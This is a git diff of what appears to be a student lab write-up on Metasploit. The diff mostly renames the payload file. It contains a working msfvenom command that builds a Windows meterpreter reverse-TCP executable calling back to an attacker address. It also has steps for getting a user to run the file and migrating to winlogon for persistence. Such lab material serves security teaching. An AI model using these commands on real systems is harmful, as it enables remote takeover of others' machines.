@@ -34,7 +34,7 @@ Find the attackers ip address using ifconfig
 
 
 
-Create a malicious executable file fun.exe using msenom command
+Create a malicious executable file praveen.exe using msenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT
 ![Screenshot 2025-04-07 111202](https://github.com/user-attachments/assets/a5850360-7890-4b7d-b3bf-f84f7eec2f96)
@@ -65,8 +65,6 @@ Invoke msfconsole:
 ## OUTPUT:
 
 
-
-
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
 
@@ -93,7 +91,7 @@ Bypass any warning boxes, double-click the file, and allow it to run.
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
 
-The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
+The Metasploit shell is running inside the "praveen.exe" process. If the user closes that process, or logs off, the connection will be lost.
 To become more persistent, we'll migrate to a process that will last longer.
 Let's migrate to the winlogon process.
 At the meterpreter > prompt, execute this command:
